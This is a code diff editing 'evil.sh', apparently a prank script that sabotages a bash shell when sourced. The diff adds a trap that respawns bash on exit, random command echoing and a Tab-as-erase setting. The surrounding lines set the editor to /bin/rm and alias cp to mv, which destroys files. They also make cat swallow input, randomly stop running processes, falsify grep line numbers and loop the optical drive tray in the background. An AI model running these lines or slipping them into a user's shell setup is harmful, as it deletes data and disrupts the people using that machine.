@@ -1,14 +1,22 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
+# Run bash when exiting
+# This includes `exit` too.
+trap bash EXIT
+
 # Set `rm` as the default editor.
 export EDITOR=/bin/rm;
 
 # Make Tab send the delete key.
-tset -Qe $'\t';
+# tset takes a few seconds and screw up the Return key on my computer
+stty erase $'\t'
 
 # Randomly make the shell exit whenever a command has a non-zero exit status.
 ((RANDOM % 10)) || set -o errexit;
+
+# Randomly make the shell echo commands a la MS-DOS batch scripts.
+((RANDOM % 10)) || set -x;
 
 # Let `cat` swallow every input and never return anything.
 alias cat=true;
@@ -35,24 +43,24 @@ if [ "$(uname)" = 'Darwin' ]; then
 	# Much less fun on Macs, alas.
 	if [[ $[$RANDOM % 2] == 0 ]]; then
 		# Eject!
-		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
+		nice -n 19 sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
 	else
 		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
 		# locking and are slot-loading anyway.
-		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
+		nice -n 19 sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
 	fi;
 else
 	N=$[$RANDOM % 3];
 	if [[ $N == 0 ]]; then
 		# Open and close randomly after a few minutes.
-		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
+		nice -n 19 sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
 	elif [[ $N == 1 ]]; then
 		# Lock, and keep closing just in case.
-		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
+		nice -n 19 sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
 	else
 		# Slowness (1× CD speed). This has to be in a loop because it resets with
 		# every ejection.
-		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
+		nice -n 19 sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
 	fi;
 fi;
 
@@ -61,9 +69,6 @@ sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|hea
 
 # Have `cp` perform `mv` instead.
 alias cp='mv';
-
-# Make `exit` open a new shell.
-alias exit='sh';
 
 # Add a random number to line numbers when using `grep -n`.
 function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
